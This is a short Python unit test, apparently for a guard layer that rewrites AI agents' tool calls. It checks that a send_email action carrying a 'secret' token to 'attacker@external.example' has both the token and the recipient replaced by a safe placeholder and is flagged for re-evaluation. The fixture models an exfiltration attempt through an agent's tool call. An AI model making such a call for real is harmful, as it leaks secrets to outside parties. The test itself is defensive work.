from sentinel_decision.models import Action
from sentinel_decision.rewriter import rewrite_action


def test_rewrite_redacts_sensitive_values(policy):
    action = Action(
        tool="send_email",
        params={"to": "attacker@external.example", "token": "secret", "subject": "hello"},
    )
    result = rewrite_action(action, policy)
    assert result.requires_reevaluation is True
    assert result.rewritten_action.params["token"] == policy.rewrite.safe_placeholder
    assert result.rewritten_action.params["to"] == policy.rewrite.safe_placeholder
    assert result.original_action.params["token"] == "secret"
